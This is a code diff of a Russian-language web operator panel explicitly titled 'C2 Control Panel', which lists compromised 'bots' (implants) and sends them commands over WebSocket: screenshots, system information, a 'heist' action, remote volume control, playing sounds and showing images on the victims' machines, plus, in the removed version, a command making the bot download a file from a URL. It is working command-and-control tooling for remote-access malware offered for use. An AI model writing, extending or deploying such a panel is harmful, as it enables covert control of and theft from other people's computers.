@@ -2,253 +2,215 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>C2 Control Panel - Visual Edition</title>
+    <title>C2 Control Panel</title>
     <style>
-        body { background-color: #2b2b2b; color: #dcdcdc; font-family: monospace; display: flex; margin: 0; height: 100vh; }
-        .sidebar { width: 250px; border-right: 1px solid #444; padding: 10px; display: flex; flex-direction: column; background-color: #313335; }
-        .main-content { flex-grow: 1; display: flex; flex-direction: column; }
-        .controls-panel { padding: 20px; border-bottom: 1px solid #444; }
-        .media-panel { padding: 20px; flex-grow: 1; overflow-y: auto; }
-        #bot-list { list-style: none; padding: 0; }
-        #bot-list li { padding: 8px; cursor: pointer; border-radius: 4px; margin-bottom: 5px; }
-        #bot-list li:hover { background-color: #444; }
-        #bot-list li.selected { background-color: #007bff; color: white; font-weight: bold; }
-        .log-panel { height: 150px; border-top: 1px solid #444; padding: 10px; overflow-y: scroll; background-color: #1e1e1e; font-size: 12px; }
-        #log-output { white-space: pre-wrap; }
-        button { background-color: #444; border: 1px solid #555; color: white; padding: 10px 15px; text-align: center; font-size: 14px; margin: 4px 2px; cursor: pointer; border-radius: 5px; transition: background-color 0.2s; }
-        button:hover { background-color: #555; }
-        button.action { background-color: #b71c1c; }
-        .file-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 15px; margin-top: 10px; }
-        .audio-button { width: 100%; background-color: #005f8c; text-overflow: ellipsis; overflow: hidden; white-space: nowrap; }
-        .log-error { color: #ff5555; }
-        h3, h4 { border-bottom: 1px solid #444; padding-bottom: 5px; }
-
-        .image-card {
-            background-color: #3c3f41;
-            border: 1px solid #555;
-            border-radius: 5px;
-            cursor: pointer;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding: 10px;
-            transition: background-color 0.2s;
-        }
-        .image-card:hover { background-color: #4f5254; }
-        .image-card img {
-            width: 100px;
-            height: 100px;
-            object-fit: cover;
-            border-radius: 4px;
-        }
-        .image-card span {
-            margin-top: 8px;
-            font-size: 12px;
-            text-align: center;
-            word-break: break-all;
-        }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; background-color: #121212; color: #e0e0e0; margin: 0; padding: 20px; font-size: 14px; }
+        .container { max-width: 1200px; margin: auto; display: grid; grid-template-columns: 300px 1fr; gap: 20px; }
+        .panel { background-color: #1e1e1e; border-radius: 8px; padding: 20px; box-shadow: 0 4px 8px rgba(0,0,0,0.2); }
+        h1, h2 { color: #bb86fc; border-bottom: 2px solid #373737; padding-bottom: 10px; margin-top: 0; }
+        #bot-list ul { list-style-type: none; padding: 0; margin: 0; max-height: 70vh; overflow-y: auto; }
+        #bot-list li { padding: 12px; border-radius: 6px; cursor: pointer; transition: background-color 0.2s; border-bottom: 1px solid #2a2a2a; }
+        #bot-list li:last-child { border-bottom: none; }
+        #bot-list li:hover { background-color: #333; }
+        #bot-list li.selected { background-color: #bb86fc; color: #121212; font-weight: bold; }
+        #controls-panel, #file-browser { display: none; }
+        #log-container { position: fixed; bottom: 0; left: 0; width: 100%; background-color: #1e1e1e; box-shadow: 0 -4px 8px rgba(0,0,0,0.2); max-height: 200px; overflow-y: auto; z-index: 100; }
+        #log { padding: 15px; font-family: "SF Mono", "Fira Code", "Consolas", monospace; font-size: 12px; white-space: pre-wrap; word-wrap: break-word; }
+        .log-entry { margin-bottom: 5px; }
+        .log-time { color: #777; margin-right: 10px; }
+        button { background-color: #bb86fc; color: #121212; border: none; padding: 10px 15px; border-radius: 6px; cursor: pointer; font-size: 14px; transition: background-color 0.2s; }
+        button:hover { background-color: #a362fc; }
+        .control-group { margin-bottom: 20px; }
+        .file-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 15px; }
+        .file-item { text-align: center; cursor: pointer; }
+        .file-item img { width: 80px; height: 80px; object-fit: cover; border-radius: 6px; border: 2px solid #373737; }
+        .file-item p { margin: 5px 0 0; font-size: 12px; word-break: break-all; }
+        input[type="range"] { width: 100%; }
     </style>
 </head>
 <body>
-    <div class="sidebar">
-        <h3>Боты онлайн:</h3>
-        <ul id="bot-list"></ul>
-    </div>
 
-    <div class="main-content">
-        <div class="controls-panel">
-            <h3>Управление: <span id="selected-bot-name" style="color: #00e676;">...бот не выбран...</span></h3>
-            <div style="display: flex; flex-wrap: wrap; gap: 20px;">
-                <div>
-                    <h4>Системные действия</h4>
-                    <button class="action" onclick="runHeist()">Начать HEIST</button>
-                    <button class="action" onclick="runSysInfo()">Системная информация</button>
-                    <button class="action" onclick="runScreenshot()">Скриншот</button>
+<div class="container">
+    <div class="panel" id="bot-list">
+        <h2>Онлайн Боты</h2>
+        <ul id="bots"></ul>
+    </div>
+    <div class="panel" id="main-controls">
+        <h2 id="selected-bot-header">Выберите бота</h2>
+        <div id="controls-panel">
+            <div class="control-group">
+                <h3>Управление</h3>
+                <button onclick="sendCommand('screenshot')">Скриншот</button>
+                <button onclick="sendCommand('sysinfo')">Инфо о системе</button>
+                <button onclick="sendCommand('heist')">Heist</button>
+            </div>
+            <div class="control-group">
+                <h3>Громкость</h3>
+                <input type="range" id="volume-slider" min="0" max="100" onchange="setVolume(this.value)">
+                <button onclick="sendCommand('mute')">Mute/Unmute</button>
+            </div>
+            <div class="control-group" id="file-browser">
+                <div id="audio-files">
+                    <h3>Аудио</h3>
+                    <div class="file-grid" id="audio-grid"></div>
                 </div>
-                <div>
-                    <h4>Управление звуком</h4>
-                    <label for="volume-slider">Громкость:</label>
-                    <input type="range" min="0" max="100" value="50" id="volume-slider" oninput="setVolume(this.value)">
-                    <button onclick="toggleMute()">Вкл/Выкл Звук</button>
-                </div>
-                <div>
-                    <h4>Загрузка файлов</h4>
-                    <input type="text" id="download-url" placeholder="URL файла..." style="width: 250px;">
-                    <button onclick="downloadFile()">Загрузить</button>
+                <div id="image-files">
+                    <h3>Изображения</h3>
+                    <div class="file-grid" id="image-grid"></div>
                 </div>
             </div>
         </div>
-
-        <div class="media-panel">
-            <h3>Пранки и Медиа</h3>
-            <h4>Локальные звуки</h4>
-            <div id="audio-files" class="file-grid"></div>
-            <h4>Локальные изображения</h4>
-            <div id="image-files" class="file-grid"></div>
-        </div>
-
-        <div class="log-panel">
-            <div id="log-output"></div>
-        </div>
     </div>
+</div>
 
-    <script>
-        let ws;
-        let selectedBot = null;        
-        const botList = document.getElementById('bot-list');
-        const selectedBotName = document.getElementById('selected-bot-name');
-        const logOutput = document.getElementById('log-output');
+<div id="log-container">
+    <div id="log"></div>
+</div>
 
-        function log(message, isError = false) {
-            const entry = document.createElement('div');
-            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
-            if (isError) {
-                entry.className = 'log-error';
+<script>
+    const wsProtocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+    const wsUrl = `${wsProtocol}//${window.location.host}/ws`;
+    let ws;
+    let selectedBot = null;
+
+    const botList = document.getElementById('bots');
+    const controlsPanel = document.getElementById('controls-panel');
+    const fileBrowser = document.getElementById('file-browser');
+    const selectedBotHeader = document.getElementById('selected-bot-header');
+
+    function log(message) {
+        const logDiv = document.getElementById('log');
+        const time = new Date().toLocaleTimeString();
+        logDiv.innerHTML += `<div class="log-entry"><span class="log-time">[${time}]</span>${message}</div>`;
+        logDiv.scrollTop = logDiv.scrollHeight;
+    }
+
+    function connect() {
+        ws = new WebSocket(wsUrl);
+
+        ws.onopen = () => {
+            log('Соединение с C2 установлено.');
+            ws.send(JSON.stringify({ type: 'operator' }));
+        };
+
+        ws.onmessage = (event) => {
+            const data = JSON.parse(event.data);
+            switch (data.type) {
+                case 'bot_list':
+                    updateBotList(data.data);
+                    break;
+                case 'status':
+                    log(data.data);
+                    break;
+                case 'bot_details':
+                    if (data.bot_id === selectedBot) {
+                        log(`Получены детали для ${selectedBot}.`);
+                        const botData = data.data;
+                        updateFileList(botData.files);
+                        updateVolumeSlider(botData.volume);
+                    }
+                    break;
             }
-            logOutput.prepend(entry);
-        }
+        };
 
-        function connectWs() {
-            log("Подключение к C2...");
-            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-            ws = new WebSocket(`${protocol}//${window.location.host}/ws`);
+        ws.onclose = () => {
+            log('Соединение с C2 потеряно. Попытка переподключения через 5 секунд...');
+            setTimeout(connect, 5000);
+            controlsPanel.style.display = 'none';
+        };
 
-            ws.onopen = () => {
-                log("Соединение с C2 установлено.");
-                ws.send(JSON.stringify({ type: 'operator' }));
-            };
+        ws.onerror = (error) => {
+            log('Ошибка WebSocket.');
+            ws.close();
+        };
+    }
 
-            ws.onmessage = (event) => {
-                const data = JSON.parse(event.data);
-                switch (data.type) {
-                    case 'bot_list':
-                        updateBotList(data.data);
-                        break;
-                    case 'bot_details':
-                        displayBotDetails(data.bot_id, data.data);
-                        break;
-                    case 'status':
-                        log(`[${selectedBot || 'SERVER'}] ${data.data}`, data.data.startsWith('❌'));
-                        break;
-                }
-            };
-
-            ws.onclose = () => {
-                log("Соединение с C2 потеряно. Переподключение через 5 секунд...", true);
-                setTimeout(connectWs, 5000);
-            };
-
-            ws.onerror = (e) => {
-                log("Ошибка WebSocket. Проверьте консоль браузера (F12).", true);
-            };
-        }
-
-        function updateBotList(bots) {
-            const currentSelected = selectedBot;
-            botList.innerHTML ='';
+    function updateBotList(bots) {
+        botList.innerHTML = '';
+        if (bots.length === 0) {
+            botList.innerHTML = '<li>Нет активных ботов</li>';
+        } else {
             bots.forEach(botId => {
                 const li = document.createElement('li');
-                li.textContent = botId.replace('implant_', '');
-                li.dataset.botId = botId;
-                if (botId === currentSelected) {
-                    li.classList.add('selected');
+                li.textContent = botId;
+                li.onclick = () => selectBot(botId);
+                if (botId === selectedBot) {
+                    li.className = 'selected';
                 }
-                li.onclick = () => selectBot(botId, li);
                 botList.appendChild(li);
             });
-             if (bots.length > 0 && !bots.includes(currentSelected)) {
-                selectBot(bots[0], botList.firstChild);
-            } else if (bots.length === 0) {
-                selectedBot = null;
-                selectedBotName.textContent = "...бот не выбран...";
-            }
         }
+    }
 
-        function selectBot(botId, element) {
-            if (selectedBot) {
-                const oldSelected = botList.querySelector(`li.selected`);
-                if(oldSelected) oldSelected.classList.remove('selected');
-            }
-            selectedBot = botId;
-            element.classList.add('selected');
-            selectedBotName.textContent = botId.replace('implant_', '');
-            log(`Выбран бот: ${selectedBot}`);
-            ws.send(JSON.stringify({ type: 'get_details', target_id: selectedBot }));
+    function selectBot(botId) {
+        selectedBot = botId;
+        log(`Выбран бот: ${botId}`);
+
+        document.querySelectorAll('#bots li').forEach(li => {
+            li.classList.toggle('selected', li.textContent === botId);
+        });
+        selectedBotHeader.textContent = `Управление: ${botId}`;
+        controlsPanel.style.display = 'block';
+
+        const payload = { type: 'command', target_id: botId, action: 'get_details' };
+
+        if (ws && ws.readyState === WebSocket.OPEN) {
+            ws.send(JSON.stringify(payload));
+            log(`Запрошены детали у ${botId}...`);
+        } else {
+            log('Ошибка: WebSocket не подключен.');
         }
+    }
 
-        function displayBotDetails(botId, details) {
-            if(botId !== selectedBot) return;
-            if (details.volume !== undefined) {
-                document.getElementById('volume-slider').value = details.volume;
-            }
-            if (details.files) {
-                displayFiles(details.files);
-            }
+    function updateFileList(files) {
+        const audioGrid = document.getElementById('audio-grid');
+        const imageGrid = document.getElementById('image-grid');
+        audioGrid.innerHTML = '';
+        imageGrid.innerHTML = '';
+
+        if (files) {
+            fileBrowser.style.display = 'block';
+            (files.audio || []).forEach(filename => {
+                audioGrid.innerHTML += `<div class="file-item" onclick="sendCommand('play', {filename: '${filename}'})"><p>🎵 ${filename}</p></div>`;
+            });
+            (files.image || []).forEach(file => {
+                const thumbnailSrc = file.thumbnail ? `data:image/jpeg;base64,${file.thumbnail}` : '';
+                imageGrid.innerHTML += `<div class="file-item" onclick="sendCommand('show', {filename: '${file.filename}'})"><img src="${thumbnailSrc}" alt="${file.filename}"><p>${file.filename}</p></div>`;
+            });
+        } else {
+             fileBrowser.style.display = 'none';
         }
+    }
 
-        function displayFiles(files) {
-            const audioContainer = document.getElementById('audio-files');
-            const imageContainer = document.getElementById('image-files');
-            audioContainer.innerHTML = '';
-            imageContainer.innerHTML = '';
-
-            if (files && files.audio) {
-                files.audio.forEach(filename => {
-                    const button = document.createElement('button');
-                    button.textContent = filename;
-                    button.className = 'audio-button';
-                    button.onclick = () => playSound(filename);
-                    audioContainer.appendChild(button);
-                });
-            }
-            if (files && files.image) {
-                files.image.forEach(imageObject => {
-                    const card = document.createElement('div');
-                    card.className = 'image-card';
-                    card.onclick = () => showImage(imageObject.filename);
-
-                    const img = document.createElement('img');
-                    if (imageObject.thumbnail) {
-                        img.src = `data:image/jpeg;base64,${imageObject.thumbnail}`;
-                    } else {
-                        img.alt = 'no preview';
-                    }
-
-                    const nameSpan = document.createElement('span');
-                    nameSpan.textContent = imageObject.filename;
-
-                    card.appendChild(img);
-                    card.appendChild(nameSpan);
-                    imageContainer.appendChild(card);
-                });
-            }
+    function updateVolumeSlider(volume) {
+        const slider = document.getElementById('volume-slider');
+        // --- ВОТИСПРАВЛЕННАЯ СТРОКА ---
+        if (volume !== null && volume !== undefined) {
+            slider.value = volume;
         }
+    }
 
-        function sendCommand(type, payload) {
-             if (!selectedBot) {
-                log("Ошибка: бот не выбран!", true);
-                return;
-            }
-            ws.send(JSON.stringify({ type: type, target_id: selectedBot, payload: payload }));
+    function sendCommand(action, params = {}) {
+        if (!selectedBot) {
+            log('Ошибка: бот не выбран.');
+            return;
         }
+        const payload = {
+            type: 'command',
+            target_id: selectedBot,
+            action: action,
+            ...params
+        };
+        ws.send(JSON.stringify(payload));
+        log(`Команда '${action}' отправлена боту ${selectedBot}`);
+    }
 
-        function setVolume(level) { sendCommand('command', { action: 'volume', level: level }); }
-        function toggleMute() { sendCommand('command', { action: 'mute' }); }
-        function runHeist() { sendCommand('command', { action: 'heist' }); }
-        function runSysInfo() { sendCommand('command', { action: 'sysinfo' }); }
-        function runScreenshot() { sendCommand('command', { action: 'screenshot' }); }
-        function playSound(filename) { sendCommand('command', { action: 'play', filename: filename }); }
-        function showImage(filename) { sendCommand('command', { action: 'show', filename: filename }); }
-        function downloadFile() {
-            const url = document.getElementById('download-url').value;
-            if (!url) {
-                log("URL для загрузки пуст!", true);
-                return;
-            }
-            sendCommand('command', { action: 'download', url: url });
-        }
+    function setVolume(level) {
+        sendCommand('volume', { level: level });
+    }
 
-        document.addEventListener('DOMContentLoaded', connectWs);
-    </script>
+    connect();
+</script>
+
 </body>
 </html>
